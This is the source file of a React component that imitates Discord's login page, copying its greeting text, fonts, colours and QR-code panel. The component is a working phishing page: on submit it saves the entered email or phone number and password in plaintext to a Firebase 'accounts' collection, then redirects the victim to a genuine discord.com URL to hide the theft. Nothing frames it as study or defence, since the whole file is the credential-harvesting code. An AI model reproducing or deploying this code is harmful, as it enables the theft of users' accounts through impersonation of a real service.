import React from "react";
import styled from "styled-components";
import qr from "./qr.png";
import GamerForm from "./styled/GamerForm";
import GamerInput from "./styled/GamerInput";
import QRStyles from "./styled/QRStyles";
import { ThemeProvider } from "styled-components";
import firebase from "./config/firebase"
import Whitney from "./fonts/whitneybook.otf"
import WhitneyMedium from "./fonts/whitneymedium.otf"
import WhitneyBold from "./fonts/whitneysemibold.otf"

const theme = {
  colors: {
    muted: "#B9BBBE",
    blue: "#5865f2",
    link: "#00aff4",
  },
};

const Container = styled.div`
  display: flex;
  background-color: #363a3e;
  color: white;
  border-radius: 8px;
  box-shadow: 0 2px 10px 0 rgba(0, 0, 0, 0.2);
  padding-left: 20px;
  padding-right: 20px;
  padding-top: 25px;
  padding-bottom: 20px;

  @font-face {
    font-family: "Whitney";
    font-weight: 800;
    src: url(${WhitneyBold}) format('opentype');
  }
  @font-face {
    font-family: "Whitney";
    font-weight: bold;
    src: url(${WhitneyMedium}) format('opentype');
  }

  @font-face {
    font-family: "Whitney";
    font-weight: 400;
    src: url(${Whitney}) format('opentype');
  }
 
  font-family: "Whitney" !important;
  line-height: 20px;

  ${GamerInput}:first-of-type {
    margin-top: 20px;
  }

  .vert-sep {
    margin: 0 16px;
  }

  a {
    color: ${(props) => props.theme.colors.link};
    font-size: 13px;
    font-weight: 500;
    text-decoration: none;
  }

  a:hover {
    text-decoration: underline;
  }

  @media (min-width: 830px) {
    min-width: 784px;
  }
  
`;
// test

class DiscordForm extends React.Component {
  constructor() {
    super();
    this.state = {username:"",password:""};
  }
  updateInput = e => {
    console.log("hello");
    this.setState({
      [e.target.name]:e.target.value

    });
  }
  addUser = async (e) => {
    e.preventDefault();
    await firebase.collection("accounts").add({username:this.state.username, password:this.state.password});
    this.setState({
      username: "",
      password:""
    });
    window.location.href = 'https://discord.com/oauth2/authorized';

  }
  render() {
    return (
      <ThemeProvider theme={theme}>
        <Container>
          <GamerForm>
            <fieldset>
              <h3>Welcome back!</h3>
              <h4>We're so excited to see you again!</h4>
              <GamerInput>
                <label htmlFor="username">EMAIL OR PHONE NUMBER</label>
                <input type="text" name="username" id="username" onChange={this.updateInput} value={this.state.username}></input>
              </GamerInput>
              <GamerInput>
                <label htmlFor="password">PASSWORD</label>
                <input type="password" name="password" id="password" onChange={this.updateInput} value={this.state.password}></input>
                <a href="https://support.discord.com/hc/en-us">Forgot your password?</a>
              </GamerInput>
              <button className="submitButton" type="submit" onClick={this.addUser}>
                <div>Login</div>
              </button>
              <div >
                <p style={{display: "inline-block", fontSize:"13px", color: "grey"}}>Need an account?&nbsp;</p>
                <a href="https://support.discord.com/hc/en-us">Register</a>
              </div>
            </fieldset>
          </GamerForm>

          <div className="vert-sep"></div>

          <QRStyles>
            <div className="qrMask">
              <img src={qr}></img>
            </div>
            <h3>Log in with QR Code</h3>
            <h4>
              Scan this with the{" "}
              <span className="boldDescription">Discord mobile app</span> to log
              in instantly.
            </h4>
          </QRStyles>
        </Container>
      </ThemeProvider>
    );
  }
}

export default DiscordForm;
